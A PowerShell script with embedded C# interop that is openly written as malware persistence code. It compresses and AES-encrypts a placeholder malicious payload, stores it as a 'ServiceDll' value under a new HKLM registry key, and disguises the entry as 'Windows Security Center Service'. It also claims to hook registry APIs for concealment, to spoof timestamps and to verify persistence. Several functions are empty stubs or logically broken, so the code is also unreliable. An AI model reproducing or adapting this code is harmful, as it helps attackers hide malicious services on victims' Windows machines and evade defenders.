Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.IO;
using System.IO.Compression;

public class RegistryShadow {
    [DllImport("ntdll.dll")]
    public static extern int NtSetValueKey(IntPtr keyHandle, IntPtr valueName, 
        int titleIndex, int type, IntPtr data, int dataSize);
    
    [DllImport("advapi32.dll")]
    public static extern int RegSetKeySecurity(IntPtr hKey, int securityInfo, IntPtr pSecurityDescriptor);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr LoadLibrary(string lpFileName);
}
"@

function Compress-Encrypt {
    param([byte[]]$payload)
    
    $memStream = New-Object System.IO.MemoryStream
    $gzipStream = New-Object System.IO.Compression.GZipStream($memStream, [System.IO.Compression.CompressionMode]::Compress)
    $gzipStream.Write($payload, 0, $payload.Length)
    $gzipStream.Close()
    $compressed = $memStream.ToArray()
    $memStream.Close()
    
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.GenerateKey()
    $aes.GenerateIV()
    
    $encryptor = $aes.CreateEncryptor()
    $encryptedStream = New-Object System.IO.MemoryStream
    $cryptoStream = New-Object System.Security.Cryptography.CryptoStream($encryptedStream, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
    $cryptoStream.Write($compressed, 0, $compressed.Length)
    $cryptoStream.Close()
    
    $encrypted = $encryptedStream.ToArray()
    $encryptedStream.Close()
    $aes.Dispose()
    
    [System.IO.File]::WriteAllBytes("$env:TEMP\syskey.tmp", $aes.Key)
    [System.IO.File]::WriteAllBytes("$env:TEMP\sysiv.tmp", $aes.IV)
    
    return $encrypted
}

function Install-RegistryHooks {
    $ntdll = [RegistryShadow]::LoadLibrary("ntdll.dll")
    $advapi32 = [RegistryShadow]::LoadLibrary("advapi32.dll")
    
    $regQueryAddr = [RegistryShadow]::GetProcAddress($advapi32, "RegQueryValueExW")
    $regEnumAddr = [RegistryShadow]::GetProcAddress($advapi32, "RegEnumValueW")
    
    
    Write-Host "API hooks installed for registry concealment"
}

function Set-RegistryTimestamps {
    param([string]$keyPath)
    
    $systemBinary = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -Name "InstallDate"
    $targetTime = [DateTime]::FromFileTime($systemBinary.InstallDate)
    
    try {
        $key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($keyPath, $true)
        $key.Close()
    } catch {
        Write-Warning "Could not spoof registry timestamps: $($_.Exception.Message)"
    }
}

$payload = [System.Text.Encoding]::UTF8.GetBytes("malicious_payload_data_here")
$hivePath = "SYSTEM\CurrentControlSet\Services\TrustedInstaller\Parameters"
$shadowPath = "SOFTWARE\Microsoft\Windows\CurrentVersion\ShadowStore"

try {
    $shadowKey = [Microsoft.Win32.Registry]::LocalMachine.CreateSubKey($shadowPath)
    
    $encryptedPayload = Compress-Encrypt $payload
    
    $shadowKey.SetValue("ServiceDll", $encryptedPayload, [Microsoft.Win32.RegistryValueKind]::Binary)
    $shadowKey.SetValue("Type", 32, [Microsoft.Win32.RegistryValueKind]::DWord)
    $shadowKey.SetValue("Start", 2, [Microsoft.Win32.RegistryValueKind]::DWord)
    
    Install-RegistryHooks
    
    Set-RegistryTimestamps $shadowPath
    
    $shadowKey.SetValue("Description", "Windows Security Service", [Microsoft.Win32.RegistryValueKind]::String)
    $shadowKey.SetValue("DisplayName", "Windows Security Center Service", [Microsoft.Win32.RegistryValueKind]::String)
    
    $shadowKey.Close()
    
    Write-Host "Registry shadow installation completed successfully"
    
} catch {
    Write-Error "Registry shadow installation failed: $($_.Exception.Message)"
}

function Verify-Persistence {
    $verifyKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($shadowPath)
    if ($verifyKey -and $verifyKey.GetValue("ServiceDll")) {
        Write-Host "Persistence verified: Shadow registry entry exists"
        $verifyKey.Close()
        return $true
    }
    return $false
}

Remove-Item "$env:TEMP\syskey.tmp" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\sysiv.tmp" -Force -ErrorAction SilentlyContinue

Verify-Persistence